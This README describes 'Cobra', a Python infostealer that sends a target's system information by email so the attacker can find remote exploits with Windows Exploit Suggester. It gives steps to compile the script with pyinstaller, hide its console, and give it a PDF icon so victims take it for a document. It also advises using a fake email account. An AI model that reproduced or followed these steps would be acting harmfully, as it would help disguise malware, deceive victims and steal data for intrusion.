# Cobra

![Capture](https://media.tenor.com/images/3a4c110f64266faf436b0e2e7fa53512/tenor.gif)

`THE SYSTEM INFO STEALED BY COBRA CAN BE ADDED TO A TEXT FILE AND THEN RUN AGAINST SOMETHING LIKE WINDOWS EXPLOIT SUGGESTER..`

# WHY COBRA

In some situations sending malicious files or backdoors directly to the target can be risky..

cobra allows us to steal system info stealthly and then use that system info against windows exploit suggester  to look for remote exploits...

# STEPS TO RUN

`python3 wrf.py`

this command will edit the cobra.py file with the specified email and password

`pip3 install pyinstaller`

this will install pyinstaller on your system

`C:\Path to your python3 installed on your system\Scripts\pyinstaller cobra.py --onefile --noconsole --icon pdf-icon{path}`

This will compile the malicious python file to a executable and you may add icon of pdf to it using the --icon option to make it look less suspicious...

*After Stealing the info you can copy it and write it to a text file which you can furthur use with windows exploit suggester to look for remote exploits*

# USING

after you have cloned the repository you can use the wrf.py file to edit the email and password in file...

`KEEP A NOTE THAT INSECURE APP ACESS SHOULD BE ENABLED ON THE EMAIL WHICH YOU ARE GOING TO USE FOR THIS PURPOSE`

**After the wrf.py file has edited and saved the another file named cobra.py you can compile the file using pyinstaller on your windows machine**

`Use Only Python3 to run and compile the scripts`

*Install pyinstall using pip3*

# MORE INFO

you can make your executable Look like a PDF using pyinstaller and also add a pdf--icon please add --noconsole option in pyinstaller to configure the executable to run in background this will not make the user suspicious...

`You are recommended to use a Fake email account...if you don't have then make one now..`
